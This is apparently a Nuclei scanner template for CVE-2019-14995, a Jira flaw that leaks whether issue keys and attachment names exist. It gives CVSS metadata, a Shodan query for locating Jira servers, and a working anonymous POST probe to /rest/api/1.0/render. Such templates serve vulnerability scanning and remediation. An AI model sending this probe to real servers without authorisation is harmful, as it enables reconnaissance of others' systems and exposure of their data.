id: CVE-2019-14995

info:
  name: Jira Issue Key and Attachment Name Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  description: The /rest/api/1.0/render resource in Jira before version 8.4.0 allows remote anonymous attackers to determine if an attachment with a specific name exists and if an issue key is valid via a missing permissions check.
  impact: |
    Sensitive data exposure could lead to unauthorized access to critical information.
  remediation: |
    Upgrade Jira server to a version that has fixed the CVE-2019-14995 vulnerability.
  reference:
    - https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0836
    - https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0837
    - https://jira.atlassian.com/browse/JRASERVER-69792
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2019-14995
    cwe-id: CWE-862,CWE-863
    epss-score: 0.00176
    epss-percentile: 0.55822
    cpe: cpe:2.3:a:atlassian:jira_server:*:*:*:*:*:*:*:*
  metadata:
    vendor: atlassian
    product: jira_server
    shodan-query: http.component:"Atlassian Jira"

http:
  - method: POST
    path:
      - "{{BaseURL}}/rest/api/1.0/render"

    body: |
      {
        "rendererType": "atlassian-wiki-renderer",
        "unrenderedMarkup": "!{{attachment_name}}!",
        "issueKey": "{{issue_key}}"
      }

    headers:
      Content-Type: "application/json"
    matchers:
      - type: word
        words:
          - "Unable to render embedded object"
          - "No usable issue stored in the context"
        condition: or
